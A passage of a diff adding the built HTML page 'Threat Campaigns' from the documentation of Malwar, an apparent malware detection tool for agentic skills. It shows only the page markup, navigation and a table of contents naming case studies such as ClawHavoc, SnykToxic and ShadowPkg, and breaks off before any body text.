@@ -1,0 +1,3871 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Agentic Skills Malware Detection Engine">
+      
+      
+      
+        <link rel="canonical" href="https://ap6pack.github.io/malwar/guide/threat-campaigns/">
+      
+      
+        <link rel="prev" href="../../rule-testing/">
+      
+      
+        <link rel="next" href="../../crawl/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.3">
+    
+    
+      
+        <title>Threat Campaigns - Malwar</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#threat-campaigns" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Malwar" class="md-header__button md-logo" aria-label="Malwar" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Malwar
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Threat Campaigns
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Ap6pack/malwar" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Ap6pack/malwar
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Malwar" class="md-nav__button md-logo" aria-label="Malwar" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Malwar
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Ap6pack/malwar" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Ap6pack/malwar
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../getting-started/installation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../getting-started/quickstart/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quick Start
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User Guide
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    User Guide
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cli-reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../api-reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../detection-rules/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Detection Rules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../custom-rules/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Custom Rules (YAML DSL)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rule-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rule Testing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Campaigns
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Campaigns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#campaign-data-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Campaign Data Model
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-campaigns-work-in-malwar" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How Campaigns Work in malwar
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="How Campaigns Work in malwar">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#campaign-signature-relationship" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Campaign-Signature Relationship
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detection-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#campaign-attribution-in-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Campaign Attribution in Results
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#api-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        API Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#case-study-the-clawhavoc-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Study: The ClawHavoc Campaign
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Case Study: The ClawHavoc Campaign">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-actor-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Actor Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#known-threat-actors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known Threat Actors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indicators-of-compromise-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise (IOCs)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Indicators of Compromise (IOCs)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#network-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publisher-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publisher IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malwar-detection-coverage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        malwar Detection Coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seed-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seed Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#case-study-the-snyktoxic-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Study: The SnykToxic Campaign
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Case Study: The SnykToxic Campaign">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-actor-profile_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Actor Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#known-threat-actors_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known Threat Actors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indicators-of-compromise-iocs_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise (IOCs)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Indicators of Compromise (IOCs)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#network-iocs_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publisher-iocs_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publisher IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malwar-detection-coverage_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        malwar Detection Coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seed-data_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seed Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#case-study-the-shadowpkg-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Study: The ShadowPkg Campaign
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Case Study: The ShadowPkg Campaign">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-actor-profile_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Actor Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#known-threat-actors_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known Threat Actors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indicators-of-compromise-iocs_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise (IOCs)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Indicators of Compromise (IOCs)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#package-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Package IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#infrastructure-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Infrastructure IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publisher-iocs_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publisher IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malwar-detection-coverage_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        malwar Detection Coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seed-data_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seed Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adding-new-campaigns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding New Campaigns
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Adding New Campaigns">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-define-the-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Define the Campaign
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-create-threat-signatures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Create Threat Signatures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-add-known-publishers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Add Known Publishers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-add-hardcoded-detection-rules-optional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Add Hardcoded Detection Rules (Optional)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-verify-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Verify Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#best-practices-for-campaign-tracking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices for Campaign Tracking
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
